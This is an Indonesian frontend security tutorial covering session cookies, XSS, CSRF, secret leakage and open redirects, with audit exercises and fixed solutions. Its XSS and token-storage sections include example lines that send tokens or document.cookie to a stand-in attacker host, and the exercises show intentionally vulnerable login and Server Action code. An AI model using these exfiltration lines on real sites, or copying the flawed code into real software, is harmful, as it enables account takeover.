---
title: 'Modul 15: Autentikasi, Sesi, dan Keamanan Frontend'
description: Menyembunyikan tombol bukan pengamanan. Modul ini membahas tempat token yang benar, serangan yang wajib dikenali, dan batas tanggung jawab frontend yang sebenarnya.
date: 2026-11-25
slug: modul-15-auth-dan-keamanan
tags: tutorial frontend
series: Tutorial Frontend
status: draft
---

Modul sebelumnya menutup dengan empat pertanyaan, dan keempatnya punya jawaban yang sudah mapan di industri. Yang membuatnya tetap jadi sumber masalah adalah satu kesalahpahaman: banyak orang mengira keamanan adalah urusan backend saja.

Benar bahwa keputusan akhir selalu di server. Tapi ada daftar pekerjaan yang hanya bisa dikerjakan frontend, dan kalau salah, backend yang sempurna pun tidak menolong:

| Tanggung jawab frontend | Akibat kalau salah |
| --- | --- |
| Tempat menyimpan token sesi | Satu celah XSS berarti akun pengguna diambil alih |
| Menyusun HTML dari data pengguna | Celah XSS itu sendiri |
| Menangani URL dan pengalihan | Pengguna diarahkan ke situs phishing dari domain Anda |
| Menampilkan kemampuan sesuai hak akses | Pengguna bingung, atau mencoba aksi yang pasti ditolak |
| Tidak membocorkan rahasia ke bundel | Kunci API jadi milik publik |
| Tidak mencatat data sensitif | Token dan data pribadi masuk ke log pihak ketiga |

## Autentikasi, otorisasi, dan satu aturan yang tidak berubah

**Autentikasi** menjawab "siapa Anda". **Otorisasi** menjawab "apa yang boleh Anda lakukan". Keduanya sering disingkat sama, padahal kesalahan yang terjadi berbeda jenis.

Satu aturan yang berlaku di semua keadaan: **apa pun yang diputuskan di browser bisa diubah pengguna.** Tombol yang disembunyikan tetap bisa dipanggil lewat permintaan langsung. Pemeriksaan `if (peran === 'admin')` di React hanya menentukan tampilan, bukan izin.

Jadi tampilan dan izin adalah dua hal yang dikerjakan dua kali, di dua tempat, dengan tujuan berbeda:

```tsx
// Di klien: untuk kenyamanan, supaya pengguna tidak mencoba yang pasti gagal
{sesi.peran === 'admin' && <TombolHapus id={produk.id} />}
```

```ts
// Di server: untuk keamanan, dan ini yang menentukan
'use server';
export async function hapusProduk(id: string) {
  const sesi = await bacaSesi();
  if (sesi?.peran !== 'admin') {
    throw new Error('Tidak berhak');
  }
  await db.produk.hapus(id);
}
```

Hilangkan yang pertama, aplikasi jadi membingungkan. Hilangkan yang kedua, aplikasi jadi terbuka.

## Analogi: kartu akses gedung kantor

Bayangkan gedung perkantoran dengan sistem kartu akses.

**Cara yang salah.** Di pintu depan, satpam mencatat nama Anda di secarik kertas, lalu Anda membawa kertas itu sendiri. Di setiap lantai, petugas membaca kertas itu dan mempersilakan masuk. Siapa pun yang bisa mengambil atau meniru kertas Anda bisa masuk ke mana saja, dan kalau Anda menulis ulang jabatan di kertas itu, tidak ada yang tahu.

**Cara yang benar.** Anda diberi kartu yang tidak bisa dibaca atau diubah pemegangnya. Setiap pintu membaca kartu itu lalu memeriksanya ke sistem pusat. Kartu bisa dinonaktifkan dari pusat kapan saja, dan hilangnya kartu tidak berarti data Anda ikut bocor.

| Dunia gedung | Dunia web |
| --- | --- |
| Kartu akses yang tidak bisa dibaca pemegangnya | Cookie `httpOnly` berisi id sesi |
| Kertas catatan yang dibawa sendiri | Token di `localStorage` |
| Pemeriksaan di setiap pintu lantai | Pemeriksaan hak akses di setiap permintaan server |
| Daftar kartu yang dinonaktifkan | Penghapusan sesi di server |
| Orang yang menyelinap lewat pintu darurat | Permintaan langsung ke API tanpa lewat antarmuka |
| Tamu yang meminjam kartu Anda tanpa Anda sadari | CSRF |
| Orang yang menempelkan stiker palsu di mesin pembaca | XSS |

Batas analoginya: kartu fisik hilang kalau dicuri, sedangkan cookie bisa disalin tanpa pemiliknya kehilangan apa pun. Itu sebabnya cookie sesi punya masa berlaku dan bisa dibatalkan, dan itu sebabnya mendeteksi pemakaian ganda jadi penting.

## Di mana token disimpan

Ini keputusan frontend yang paling berkonsekuensi, dan jawabannya sudah lama mantap:

| Tempat | Bisa dibaca JavaScript | Ikut otomatis di permintaan | Penilaian |
| --- | --- | --- | --- |
| Cookie `httpOnly` | Tidak | Ya | **Pilihan yang benar untuk sesi** |
| Cookie biasa | Ya | Ya | Kehilangan perlindungan utamanya |
| `localStorage` | Ya | Tidak | Satu XSS berarti token terbaca |
| `sessionStorage` | Ya | Tidak | Sama, hanya umurnya lebih pendek |
| Variabel di memori | Ya, oleh kode di halaman | Tidak | Lumayan untuk access token berumur pendek, hilang saat muat ulang |

Argumen "JWT di `localStorage` lebih praktis" memang benar, dan itu yang membuatnya populer. Masalahnya satu: dengan satu celah XSS, satu baris `fetch('https://penyerang.com?t=' + localStorage.token)` menyelesaikan pekerjaan penyerang. Dengan cookie `httpOnly`, token itu tidak bisa dibaca sama sekali, jadi penyerang harus bekerja jauh lebih keras.

Bentuk cookie sesi yang benar:

```ts
cookies().set('sesi', idSesi, {
  httpOnly: true, // tidak terbaca JavaScript
  secure: true, // hanya lewat https
  sameSite: 'lax', // tidak ikut terkirim dari situs lain, kecuali navigasi biasa
  path: '/',
  maxAge: 60 * 60 * 24 * 7, // 7 hari
});
```

Satu catatan tentang isi cookie: menyimpan **id sesi** lebih baik daripada menyimpan seluruh data pengguna dalam token yang ditandatangani. Dengan id sesi, logout benar-benar membatalkan akses, dan perubahan peran langsung berlaku. Dengan token mandiri yang berumur satu jam, pengguna yang baru Anda cabut haknya tetap bisa bekerja sampai tokennya kedaluwarsa.

## XSS: serangan yang paling sering mengenai frontend

XSS terjadi saat kode penyerang berjalan di halaman Anda dengan hak yang sama seperti kode Anda. Begitu itu terjadi, penyerang bisa membaca apa pun yang bisa dibaca JavaScript Anda.

React memberi perlindungan bawaan yang nyata: semua teks dalam JSX otomatis di-escape.

```tsx
// Aman, apa pun isi namaPengguna
<p>{namaPengguna}</p>
```

Lubang yang tersisa, dan semuanya hasil perbuatan sendiri:

```tsx
// 1. Menyuntik HTML dari sumber yang tidak dikendalikan
<div dangerouslySetInnerHTML={{ __html: komentarDariPengguna }} />

// 2. URL dari pengguna, langsung dipakai
<a href={tautanDariPengguna}>Situs saya</a>
// tautan bisa berisi: javascript:fetch('https://penyerang.com?c='+document.cookie)

// 3. Menyuntik ke dalam tag script atau style
<script>{`var data = ${JSON.stringify(dataPengguna)}`}</script>

// 4. Menyebar props yang tidak diperiksa ke elemen
<div {...propsDariServer} />
```

Perbaikannya:

```tsx
// 1. Bersihkan dulu, atau lebih baik: ubah jadi teks biasa seperti di Proyek 2
import DOMPurify from 'isomorphic-dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(komentar) }} />;

// 2. Periksa protokolnya
function tautanAman(mentah: string): string | null {
  try {
    const url = new URL(mentah, window.location.origin);
    return ['http:', 'https:', 'mailto:'].includes(url.protocol) ? url.href : null;
  } catch {
    return null;
  }
}
```

Lapisan terakhir yang menahan kesalahan yang terlewat adalah Content Security Policy, yaitu header yang memberi tahu browser kode dari mana saja yang boleh dijalankan:

```text
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{acak}';
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self'
```

`frame-ancestors 'none'` sekaligus menutup clickjacking, yaitu teknik menaruh halaman Anda di dalam iframe tak terlihat supaya pengguna mengklik tombol tanpa sadar.

## CSRF

CSRF adalah situs lain yang membuat browser pengguna mengirim permintaan ke aplikasi Anda, memanfaatkan cookie yang ikut terkirim otomatis. Pengguna sedang login di aplikasi Anda, lalu membuka situs penyerang, dan situs itu mengirim form tersembunyi ke endpoint transfer Anda.

Tiga lapis pencegahannya:

1. **`SameSite=Lax` pada cookie.** Ini bawaan di browser modern, dan sudah menutup sebagian besar bentuk serangan ini karena cookie tidak ikut pada permintaan POST lintas situs.
2. **Pemeriksaan `Origin`.** Server menolak permintaan yang mengubah data kalau header `Origin` bukan domain Anda. Next.js melakukan pemeriksaan ini untuk Server Action.
3. **Token CSRF** untuk kebutuhan lintas subdomain atau alur yang tidak bisa memakai `SameSite`.

Satu hal yang perlu ditegaskan: `SameSite=Lax` tidak melindungi permintaan GET yang mengubah data. Kalau aplikasi Anda punya `GET /hapus?id=1`, itu masalah arsitektur, bukan masalah CSRF. Perubahan data tidak pernah memakai GET.

## Kebocoran rahasia

Dua cara rahasia bocor dari frontend, dan keduanya mudah terjadi tanpa disadari.

**Pertama, variabel lingkungan dengan awalan publik.** Di Next.js, apa pun yang berawalan `NEXT_PUBLIC_` ikut ke bundel browser dan terlihat siapa saja. Di Vite, awalannya `VITE_`.

```ts
// Berbahaya: ikut ke browser
NEXT_PUBLIC_API_SECRET = rahasia123;

// Benar: hanya terbaca di server
API_SECRET = rahasia123;
```

**Kedua, dan ini khas Server Component: mengirim data terlalu banyak ke Client Component.** Semua props yang dikirim dari Server Component ke Client Component ikut dikirim ke browser sebagai data, meski tidak pernah ditampilkan.

```tsx
// Berbahaya: seluruh objek pengguna ikut ke browser,
// termasuk hash password dan catatan internal
const pengguna = await db.pengguna.ambil(id);
return <ProfilKlien pengguna={pengguna} />;

// Benar: kirim hanya yang dibutuhkan tampilan
return <ProfilKlien nama={pengguna.nama} avatar={pengguna.avatar} />;
```

Kesalahan itu tidak terlihat sama sekali di layar. Satu-satunya cara menemukannya adalah membuka "View source" atau tab Network dan membaca data yang dikirim. Biasakan memeriksanya untuk halaman yang menampilkan data pengguna.

Untuk mencegahnya secara struktural, paket `server-only` membuat berkas gagal di-build kalau tidak sengaja diimpor dari kode klien:

```ts
import 'server-only';

export async function bacaRahasia() {
  /* ... */
}
```

## Daftar periksa yang lebih luas

Hal lain yang masuk tanggung jawab frontend, dan sering terlewat:

**Pengalihan terbuka.** `?lanjut=/dasbor` yang dipakai setelah login harus diperiksa. Kalau tidak, `?lanjut=https://situs-palsu.com` membuat domain Anda jadi batu loncatan phishing yang meyakinkan.

**`postMessage` tanpa memeriksa asal.** Setiap `window.addEventListener('message', ...)` wajib memeriksa `event.origin`.

**`target="_blank"` pada tautan luar.** Browser modern sudah aman secara bawaan, tapi `rel="noopener noreferrer"` tetap layak ditulis untuk dukungan yang lebih luas.

**Data sensitif di log dan alat analitik.** Token, nomor kartu, dan isi form tidak boleh masuk ke `console.log` yang tertinggal di produksi, apalagi ke pelacak error pihak ketiga. Modul 19 membahas penyaringannya.

**Dependensi.** Satu paket berbahaya di `node_modules` berjalan dengan hak penuh. Lockfile wajib di-commit, `pnpm audit` dijalankan berkala, dan kenaikan versi ditelaah, bukan diterima otomatis.

**Autofill dan pengelola password.** `autocomplete` yang benar (modul 2) bukan hanya soal kenyamanan. Pengguna yang dipaksa mengetik ulang password cenderung memilih password yang lebih lemah.

## Opsi tools

Jangan membuat sistem autentikasi sendiri kecuali itu memang produk Anda. Hashing password, pemulihan akun, verifikasi email, pembatasan percobaan, dan rotasi sesi adalah pekerjaan yang mudah salah dan mahal akibatnya.

| Pilihan | Cocok untuk | Catatan |
| --- | --- | --- |
| Auth.js (NextAuth) | Next.js, ingin menyimpan data sendiri | Gratis, banyak penyedia, konfigurasinya perlu dipahami |
| Clerk, WorkOS | Ingin cepat jadi, termasuk UI dan organisasi | Berbayar, sangat menghemat waktu |
| Supabase Auth, Firebase Auth | Sudah memakai layanannya | Terintegrasi dengan aturan akses datanya |
| Penyedia OIDC perusahaan | Lingkungan korporat | Keycloak, Entra ID, dan sejenisnya |
| Buatan sendiri | Hampir tidak pernah | Hanya kalau autentikasi memang produk Anda |

Satu hal yang pantas dilirik sekarang: **passkey**. Login tanpa password dengan kunci kriptografi di perangkat sudah didukung semua browser besar, tahan phishing, dan dukungannya tersedia di hampir semua penyedia di tabel atas. Untuk produk baru, menyediakannya sebagai pilihan bukan lagi hal eksotis.

## Latihan

### Latihan 1: Audit alur login

Potongan ini dari aplikasi nyata. Temukan enam masalah keamanannya.

```tsx
'use client';

export function FormLogin() {
  const [email, setEmail] = useState('');
  const [sandi, setSandi] = useState('');
  const params = useSearchParams();

  async function masuk() {
    const respons = await fetch('https://api.contoh.com/login', {
      method: 'POST',
      body: JSON.stringify({ email, sandi }),
    });

    const data = await respons.json();
    localStorage.setItem('token', data.token);
    localStorage.setItem('peran', data.peran);

    console.log('Login berhasil', data);
    window.location.href = params.get('lanjut') ?? '/dasbor';
  }

  return (
    <div>
      <input value={email} onChange={(e) => setEmail(e.target.value)} />
      <input value={sandi} onChange={(e) => setSandi(e.target.value)} />
      <button onClick={masuk}>Masuk</button>
    </div>
  );
}
```

> [!petunjuk]
> Periksa empat hal berurutan: di mana token berakhir, apa yang dicatat, ke mana pengguna dibawa setelahnya, dan apa yang terjadi kalau permintaannya gagal.

> [!jawaban]
>
> | # | Masalah | Akibat |
> | --- | --- | --- |
> | 1 | Token di `localStorage` | Satu XSS di mana pun di aplikasi berarti akun diambil alih |
> | 2 | `peran` disimpan di klien dan kemungkinan dipercaya | Pengguna bisa mengubahnya di DevTools. Peran hanya boleh menentukan tampilan |
> | 3 | `console.log` berisi seluruh respons | Token masuk ke console, dan ikut terkirim kalau ada pelacak error yang membaca console |
> | 4 | Pengalihan terbuka pada `lanjut` | `?lanjut=https://situs-palsu.com` membuat domain Anda jadi umpan phishing |
> | 5 | Tidak ada penanganan kegagalan | Respons 401 masuk ke jalur sukses, dan `data.token` bernilai `undefined` disimpan |
> | 6 | Bukan `form`, hanya `div` dan `button` | Enter tidak mengirim, pengelola password tidak mengenali, dan tidak ada `autocomplete` |
>
> Masalah ketujuh yang lebih dalam: autentikasi dikerjakan sepenuhnya di klien. Dengan App Router, alur ini sebaiknya jadi Server Action yang memanggil API, lalu menyetel cookie `httpOnly` dari server. Klien tidak pernah memegang token sama sekali.
>
> ```tsx
> 'use server';
>
> export async function masuk(_keadaan: unknown, data: FormData) {
>   const hasil = skemaLogin.safeParse(Object.fromEntries(data));
>   if (!hasil.success) return { pesan: 'Email atau sandi belum benar' };
>
>   const respons = await fetch(`${process.env.API_URL}/login`, {
>     method: 'POST',
>     headers: { 'content-type': 'application/json' },
>     body: JSON.stringify(hasil.data),
>   });
>
>   // Pesan sengaja sama untuk email salah dan sandi salah,
>   // supaya tidak bisa dipakai menebak email yang terdaftar
>   if (!respons.ok) return { pesan: 'Email atau sandi salah' };
>
>   const { idSesi } = await respons.json();
>
>   (await cookies()).set('sesi', idSesi, {
>     httpOnly: true,
>     secure: true,
>     sameSite: 'lax',
>     path: '/',
>     maxAge: 60 * 60 * 24 * 7,
>   });
>
>   // Hanya path internal yang diizinkan
>   const lanjut = String(data.get('lanjut') ?? '/dasbor');
>   redirect(lanjut.startsWith('/') && !lanjut.startsWith('//') ? lanjut : '/dasbor');
> }
> ```
>
> Perhatikan pemeriksaan `lanjut`: harus diawali satu garis miring dan tidak boleh diawali dua, karena `//situs-palsu.com` adalah URL absolut yang sah bagi browser.

### Latihan 2: Setel cookie untuk tiga situasi

Tentukan atribut cookie untuk tiga kebutuhan ini, lalu jelaskan pilihan Anda.

| | Situasi |
| --- | --- |
| **A** | Sesi login aplikasi perbankan, timeout 15 menit |
| **B** | Preferensi tema terang dan gelap |
| **C** | Sesi yang dipakai bersama antara `app.contoh.com` dan `akun.contoh.com` |

> [!jawaban]
>
> **A: `httpOnly`, `secure`, `sameSite: 'strict'`, `maxAge: 900`, `path: '/'`.**
> `strict` dipilih, bukan `lax`, karena untuk aplikasi keuangan masuk akal menuntut pengguna memulai dari dalam aplikasi, bukan dari tautan di situs lain. Konsekuensinya: pengguna yang mengklik tautan dari email akan terlihat belum login, dan itu memang kompromi yang diterima di sektor ini. Tambahan yang wajar: perpanjang masa berlaku setiap kali ada aktivitas, dan tampilkan peringatan sebelum sesi berakhir.
>
> **B: tanpa `httpOnly`, `secure`, `sameSite: 'lax'`, umur panjang.**
> Tema bukan rahasia, dan JavaScript di klien justru perlu membacanya. Di sini `httpOnly` tidak memberi manfaat. Kalau Anda memakai pendekatan dari modul 11 (skrip kecil sebelum first paint), cookie ini sekaligus memungkinkan server merender tema yang benar, sehingga tidak ada kedipan sama sekali.
>
> **C: `domain: '.contoh.com'`, `httpOnly`, `secure`, `sameSite: 'lax'`.**
> Dengan `domain` di tingkat induk, cookie terkirim ke semua subdomain. Dua catatan penting: pertama, semua subdomain jadi ikut dipercaya, sehingga satu subdomain yang diretas membahayakan sesi di semua subdomain lain. Kedua, karena subdomain dianggap situs yang sama oleh `SameSite`, perlindungan CSRF antar subdomain hilang, jadi pemeriksaan `Origin` jadi wajib. Kalau salah satu subdomain dipakai untuk konten buatan pengguna, jangan lakukan ini sama sekali.

### Latihan 3: Amankan Server Action

Server Action ini punya empat lubang. Temukan dan perbaiki.

```ts
'use server';

export async function ubahPeran(data: FormData) {
  const idPengguna = data.get('id') as string;
  const peranBaru = data.get('peran') as string;

  await db.pengguna.perbarui(idPengguna, { peran: peranBaru });
  revalidatePath('/admin/pengguna');

  return { ok: true };
}
```

> [!pembahasan]
>
> ```ts
> 'use server';
>
> import { z } from 'zod';
>
> const skema = z.object({
>   id: z.string().uuid(),
>   peran: z.enum(['admin', 'editor', 'pembaca']),
> });
>
> export async function ubahPeran(data: FormData) {
>   // 1. Autentikasi dan otorisasi, sebelum apa pun
>   const sesi = await bacaSesi();
>   if (!sesi) return { ok: false, pesan: 'Sesi berakhir, silakan masuk lagi' };
>   if (sesi.peran !== 'admin') return { ok: false, pesan: 'Tidak berhak' };
>
>   // 2. Validasi masukan, bukan penegasan tipe
>   const hasil = skema.safeParse(Object.fromEntries(data));
>   if (!hasil.success) return { ok: false, pesan: 'Data tidak valid' };
>
>   // 3. Aturan domain yang tidak boleh dilanggar siapa pun
>   if (hasil.data.id === sesi.idPengguna && hasil.data.peran !== 'admin') {
>     return { ok: false, pesan: 'Anda tidak dapat menurunkan peran diri sendiri' };
>   }
>
>   await db.pengguna.perbarui(hasil.data.id, { peran: hasil.data.peran });
>
>   // 4. Jejak audit untuk aksi yang mengubah hak akses
>   await db.audit.catat({
>     aksi: 'ubah-peran',
>     oleh: sesi.idPengguna,
>     target: hasil.data.id,
>     nilai: hasil.data.peran,
>     pada: new Date(),
>   });
>
>   revalidatePath('/admin/pengguna');
>   return { ok: true };
> }
> ```
>
> Empat lubangnya:
>
> 1. **Tidak ada pemeriksaan sesi dan peran.** Server Action punya URL dan bisa dipanggil langsung dengan `curl`. Tanpa pemeriksaan ini, siapa pun di internet bisa menjadikan dirinya admin.
> 2. **`as string` bukan validasi.** Itu janji sepihak dari modul 8. `peran` bisa berisi nilai apa saja, termasuk yang tidak dikenal sistem Anda.
> 3. **Tidak ada aturan domain.** Admin yang menurunkan perannya sendiri bisa membuat sistem tanpa admin sama sekali.
> 4. **Tidak ada jejak audit.** Untuk aksi yang mengubah hak akses, catatan siapa mengubah apa dan kapan hampir selalu jadi syarat, dan selalu dibutuhkan saat ada insiden.

### Latihan 4: Cari kebocorannya

Halaman ini terlihat normal di layar. Buka "View source" di browser dan Anda akan menemukan masalah. Temukan dua kebocoran, dan jelaskan cara menemukannya tanpa membaca kodenya.

```tsx
// app/profil/page.tsx (Server Component)
export default async function HalamanProfil() {
  const pengguna = await db.pengguna.ambilLengkap(idSesi);
  const pengaturan = {
    tema: pengguna.tema,
    kunciAnalitik: process.env.ANALYTICS_SECRET,
  };

  return <PanelProfil pengguna={pengguna} pengaturan={pengaturan} />;
}
```

```tsx
'use client';
export function PanelProfil({ pengguna, pengaturan }) {
  return <h1>Halo, {pengguna.nama}</h1>;
}
```

> [!jawaban]
>
> **Kebocoran 1: seluruh objek pengguna.** `ambilLengkap` hampir pasti berisi hash password, email cadangan, catatan internal, dan mungkin nomor identitas. Semuanya dikirim ke browser sebagai data serialisasi Server Component, meski hanya `nama` yang ditampilkan.
>
> **Kebocoran 2: `ANALYTICS_SECRET`.** Variabel ini tidak berawalan `NEXT_PUBLIC_`, jadi Anda mungkin mengira aman. Yang membuatnya bocor bukan awalan, melainkan karena nilainya dikirim sebagai props ke Client Component.
>
> **Cara menemukannya tanpa membaca kode**, dan ini yang perlu jadi kebiasaan:
>
> 1. Buka halaman, klik kanan, pilih "View page source".
> 2. Cari bagian `self.__next_f.push` di bagian bawah HTML. Di situlah data untuk Client Component dikirim.
> 3. Tekan Ctrl+F dan cari kata seperti `password`, `secret`, `token`, atau nilai rahasia yang Anda tahu.
>
> Perbaikannya sederhana: kirim hanya yang dibutuhkan tampilan, dan jangan pernah menyerahkan objek utuh dari database ke komponen klien.
>
> ```tsx
> const pengguna = await db.pengguna.ambilLengkap(idSesi);
> return <PanelProfil nama={pengguna.nama} tema={pengguna.tema} />;
> ```
>
> Dua pagar struktural yang layak dipasang di proyek nyata: fungsi pengambil data mengembalikan bentuk yang sudah disaring (misalnya `ambilProfilPublik`), dan `import 'server-only'` pada berkas yang menyentuh rahasia supaya kesalahan impor tertangkap saat build, bukan saat sudah tayang.

## Batasnya

Frontend bisa melakukan banyak hal benar dan tetap tidak menentukan. Tiga hal yang berada di luar kendali Anda:

**Keputusan akhir selalu di server.** Semua pekerjaan di modul ini mengurangi risiko dan memperbaiki pengalaman, tapi yang menolak permintaan tidak sah tetap server.

**Keamanan bukan daftar periksa sekali jalan.** Dependensi berubah, fitur bertambah, dan celah muncul di tempat yang dulu aman. Yang bisa dilakukan tim adalah menjadikannya bagian dari telaah kode dan pipeline, dan itu modul 19.

**Beberapa serangan tidak menyentuh kode sama sekali.** Phishing, rekayasa sosial, dan perangkat pengguna yang sudah disusupi berada di luar jangkauan aplikasi Anda. Yang bisa Anda lakukan: dukung passkey, jangan meminta pengguna mematikan perlindungan, dan jangan pernah meminta password lewat saluran lain.

## Rangkuman

- Autentikasi menjawab siapa, otorisasi menjawab boleh apa. Keduanya ditampilkan di klien, dan diputuskan di server.
- Token sesi tempatnya di cookie `httpOnly`, `secure`, `sameSite`, bukan di `localStorage`. Id sesi lebih baik daripada token mandiri karena bisa dibatalkan.
- React meng-escape teks secara otomatis. Lubang XSS yang tersisa berasal dari `dangerouslySetInnerHTML`, URL dari pengguna, dan penyebaran props yang tidak diperiksa.
- CSP dan `frame-ancestors` adalah jaring pengaman untuk kesalahan yang terlewat.
- `SameSite=Lax` menutup sebagian besar CSRF, pemeriksaan `Origin` melengkapinya, dan perubahan data tidak pernah memakai GET.
- Rahasia bocor lewat dua jalan: awalan variabel publik, dan props yang dikirim ke Client Component. Periksa dengan "View source", bukan dengan asumsi.
- Pengalihan setelah login wajib dibatasi ke path internal.
- Jangan membuat sistem autentikasi sendiri. Pakai penyedia yang sudah teruji, dan pertimbangkan passkey untuk produk baru.

## Masalah terbuka

Anda sekarang punya semua bahan untuk membangun aplikasi sungguhan: rendering di server, pengambilan data, mutasi, form tervalidasi, sesi yang aman, dan pemeriksaan hak akses di tempat yang benar.

Saatnya menyatukan semuanya pada satu aplikasi yang dipakai lebih dari satu orang, dengan data yang benar-benar tersimpan, akun yang benar-benar login, dan alamat yang benar-benar bisa dibuka siapa saja.

Bagian berikutnya adalah Proyek 4: aplikasi catatan kolaboratif dengan Next.js, lengkap dengan autentikasi, berbagi catatan antar pengguna, pembaruan optimistis, dan deploy ke internet.
